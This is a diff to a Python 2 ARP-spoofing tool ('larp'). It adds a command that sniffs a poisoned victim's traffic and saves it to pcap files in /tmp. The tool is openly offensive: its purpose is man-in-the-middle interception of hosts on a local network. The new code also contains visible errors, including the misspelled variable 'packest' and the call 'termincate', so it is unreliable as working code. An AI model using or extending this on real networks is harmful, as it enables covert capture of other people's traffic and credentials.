@@ -52,6 +52,7 @@ class larp():
         print colored("[*] Starting up...", "green")
         conf.iface = interface
         conf.verb = v
+        self.interface = interface
         self.g_ip = gateway_ip
         self.interface = interface
         self.g_mac = get_mac(self.g_ip)
@@ -92,6 +93,14 @@ class larp():
         print >> sys.stderr, colored(msg, 'red')
         sys.exit(-1)
 
+    def sniffer(self, target_ip):
+        bpf_filter = "ip host %s" % target_ip
+        f_i = 0
+        while True:
+            packets = sniff(filter=bpf_filter, iface=self.interface, count=100)
+            wrpcap('/tmp/larp_sniffer_%s_%d.cap' % (target_ip, f_i), packest)
+            f_i += 1
+
     def main(self):
         t_id = 0    # thread id
         id_map = dict()
@@ -101,28 +110,40 @@ class larp():
             self.thread_array.append(multiprocessing.Process(target=poison,\
             args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
             self.thread_array[t_id].start()
-            id_map[t_id] = [ip, self.t_mac[ip] ]
+            id_map[t_id] = [ip, self.t_mac[ip], None ]
             t_id += 1
         print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")
         while len(id_map):
             buf = raw_input('#>')
-            try:
-                if "all" in buf or "a" == buf:
-                    for i in xrange(0, t_id):
-                        self.thread_array[i].terminate()
-                        restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
-                        print colored("[^] Restored: %s" % id_map[i][0], "blue")
-                        del id_map[i]
-                elif "list" in buf or "l" == buf:
-                    for i in xrange(0, t_id):
-                        print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
-                else:
-                    self.thread_array[int(buf)].terminate()
-                    restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
-                    print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
-                    del id_map[int(buf)]
-            except:
-                print colored("[!] Available commands: all - list", "red")
+            #try:
+            if "all" in buf or "a" == buf:
+                for i in xrange(0, t_id):
+                    self.thread_array[i].terminate()
+                    restore_target(self.g_ip, self.g_mac, id_map[i][0], id_map[i][1])
+                    print colored("[^] Restored: %s" % id_map[i][0], "blue")
+                    if id_map[i][2] is not None:
+                        id_map[i][2].terminate()
+                        print colored("[^] Stoped sniffer for %s" % id_map[i][0], "blue")
+                    del id_map[i]
+            elif "list" in buf or "l" == buf:
+                for i in xrange(0, t_id):
+                    print colored("[^] %d => %s / %s" % (i, id_map[i][0], id_map[i][1]), "blue")
+            elif "sniff" in buf or "s" == buf.split(' ')[0]:
+                i = int(buf.split(' ')[1])
+                print colored("[^] Sniffig %d => %s" % (int(buf.split(' ')[1]),id_map[i][0]), "blue")
+                id_map[i][2] = multiprocessing.Process( target=self.sniffer,\
+                args=(id_map[i][0],))
+                id_map[i][2].start()
+            else:
+                self.thread_array[int(buf)].terminate()
+                restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
+                print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
+                if id_map[int(buf)][2] != None:
+                    id_map[int(buf)][2].termincate()
+                    print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
+                del id_map[int(buf)]
+            #except:
+                #print colored("[!] Available commands: all - list - sniff", "red")
         for thread in self.thread_array:
             thread.join()
 
